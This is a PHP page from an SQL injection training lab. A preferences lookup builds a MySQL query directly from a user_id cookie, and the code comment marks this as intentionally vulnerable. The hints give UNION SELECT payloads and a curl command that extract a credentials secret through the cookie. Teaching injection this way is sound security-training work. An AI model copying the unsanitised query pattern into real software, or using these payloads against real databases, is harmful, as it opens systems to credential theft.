<?php
require_once __DIR__ . '/../../includes/db.php';

$mode = $_GET['mode'] ?? 'black';
$verify_error = null;

/* =====================
   FLAG VERIFY
===================== */
if (isset($_POST['flag'])) {
    $submitted = $_POST['flag'];

    $res = mysqli_query(
        $conn,
        "SELECT secret FROM credentials WHERE service = 'database' LIMIT 1"
    );
    $row = mysqli_fetch_assoc($res);

    if ($row && $submitted === $row['secret']) {
        $_SESSION['mysql_lab17_solved'] = true;
        header("Location: " . url_lab_from_slug("mysql/lab17", $mode, $_GET['ref'] ?? ''));
        exit;
    } else {
        $verify_error = "Incorrect. Keep trying!";
    }
}

/* =====================
   COOKIE-BASED PREFERENCE LOOKUP
===================== */
$query_error   = null;
$query_result  = null;
$query_text    = null;
$cookie_uid    = $_COOKIE['user_id'] ?? null;

if ($cookie_uid !== null && $cookie_uid !== '') {
    // INTENTIONALLY VULNERABLE. Cookie value directly concatenated into query
    $query_text = "SELECT theme, language, last_login FROM preferences WHERE user_id = '$cookie_uid'";

    mysqli_report(MYSQLI_REPORT_OFF);
    $result = @mysqli_query($conn, $query_text);

    if (!$result) {
        $query_error = mysqli_error($conn);
    } else {
        $rows = [];
        while ($r = mysqli_fetch_assoc($result)) {
            $rows[] = $r;
        }
        $query_result = $rows;
    }
    mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
}
?>

<!-- Lab Description -->
<div class="card">
    <h3>Lab 17. Header Injection: Cookie</h3>

    <h4>Scenario</h4>
    <p>
        A preferences page reads a <code>user_id</code> cookie to load personalized settings
        (theme, language, last login) from the database. The cookie value is inserted
        <strong>directly into the SQL query</strong> without sanitization.
    </p>
    <p>
        <strong>Tip:</strong> Cookies are HTTP headers sent by the browser on every request.
        Developers sometimes trust cookie values because they &ldquo;set them server-side,&rdquo;
        but attackers can freely modify cookies using browser dev tools, curl, or Burp Suite.
    </p>

    <h4>Objective</h4>
    <p>
        Extract the <strong>secret</strong> from the <code>credentials</code> table
        (where <code>service = 'database'</code>) by injecting through the
        <code>user_id</code> cookie. Submit the value below.
    </p>

    <h4>Hints</h4>
    <span class="hint-toggle" data-hint="hint1">&#128161; Click for hints</span>
    <div id="hint1" class="hint-content">
        1. Set the cookie to <code>user1</code>: see preferences displayed.<br>
        2. Set the cookie to <code>'</code>: trigger a MySQL error to confirm injection.<br>
        3. Use <code>ORDER BY</code> to find the column count (3 columns).<br>
        4. UNION extraction: <code>' UNION SELECT secret, service, NOW() FROM credentials WHERE service='database' -- -</code><br>
        5. The flag appears in the theme/language fields.<br>
        6. With curl: <code>curl -b "user_id=' UNION SELECT secret,service,NOW() FROM credentials -- -" URL</code>
    </div>


</div>

<!-- Verify Flag -->
<div class="card">
    <h4>Submit Flag</h4>
    <form method="POST" class="form-row">
<input type="text" name="flag" class="input" placeholder="Enter the flag..." required>
        <button type="submit" class="btn btn-primary">Verify</button>
    </form>

    <?php if ($verify_error): ?>
        <div class="result-error result-box"><?= htmlspecialchars($verify_error) ?></div>
    <?php endif; ?>
</div>

<!-- Solved Banner -->
<?php if (!empty($_SESSION['mysql_lab17_solved'])): ?>

<div class="solved-banner">
    <span class="solved-icon">&#127942;</span>
    <div>
        <div class="solved-title">Lab Solved!</div>
        <div class="solved-desc">You successfully extracted the credential secret through SQL injection in the Cookie header.</div>
    </div>
</div>

<?php else: ?>

<!-- Cookie Setter (convenience form so users can test in-browser) -->
<div class="card">
    <h4>Set User ID Cookie</h4>
    <p style="margin-bottom:10px;">
        This form sets the <code>user_id</code> cookie via JavaScript and reloads the page.
        In a real attack, you would modify cookies using <strong>Burp Suite</strong>, <strong>curl</strong>,
        or browser developer tools.
    </p>
    <div class="form-row">
        <input type="text" id="cookie_input" class="input" placeholder="Enter user_id value (try: user1)" value="<?= htmlspecialchars($cookie_uid ?? '') ?>">
        <button type="button" class="btn btn-primary" onclick="document.cookie='user_id='+encodeURIComponent(document.getElementById('cookie_input').value)+';path=/';location.reload();">Set Cookie &amp; Reload</button>
        <button type="button" class="btn btn-primary" style="background:#c0392b;" onclick="document.cookie='user_id=;path=/;expires=Thu, 01 Jan 1970 00:00:00 GMT';location.reload();">Clear Cookie</button>
    </div>
</div>

<!-- Current Cookie Value -->
<div class="card">
    <h4>Current Cookie Value</h4>
    <?php if ($cookie_uid !== null && $cookie_uid !== ''): ?>
        <div class="result-data result-box">
            <strong>user_id</strong> = <code><?= htmlspecialchars($cookie_uid) ?></code>
        </div>
    <?php else: ?>
        <div class="result-warning result-box">No <code>user_id</code> cookie set. Use the form above to set one.</div>
    <?php endif; ?>
</div>

<?php if ($cookie_uid !== null && $cookie_uid !== ''): ?>

<!-- Show the executed query -->
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">MySQL Query</span>
    </div>
    <div class="terminal-body" data-highlight="sql">
        <span class="prompt">mysql&gt; </span><?= htmlspecialchars($query_text) ?>
    </div>
</div>

<!-- Query Results -->
<?php if ($query_error): ?>
    <div class="result-error result-box"><strong>MySQL Error:</strong> <?= htmlspecialchars($query_error) ?></div>
<?php elseif ($query_result && count($query_result) > 0): ?>
    <div class="result-data result-box">
        <table style="width:100%; border-collapse:collapse;">
            <tr>
                <th style="text-align:left; padding:6px; border-bottom:1px solid #444;">Theme</th>
                <th style="text-align:left; padding:6px; border-bottom:1px solid #444;">Language</th>
                <th style="text-align:left; padding:6px; border-bottom:1px solid #444;">Last Login</th>
            </tr>
            <?php foreach ($query_result as $row): ?>
            <tr>
                <td style="padding:6px; border-bottom:1px solid #333;"><?= htmlspecialchars($row['theme'] ?? '') ?></td>
                <td style="padding:6px; border-bottom:1px solid #333;"><?= htmlspecialchars($row['language'] ?? '') ?></td>
                <td style="padding:6px; border-bottom:1px solid #333;"><?= htmlspecialchars($row['last_login'] ?? '') ?></td>
            </tr>
            <?php endforeach; ?>
        </table>
    </div>
<?php else: ?>
    <div class="result-warning result-box">No preferences found for this user ID.</div>
<?php endif; ?>

<?php endif; // cookie set ?>

<?php endif; // solved ?>
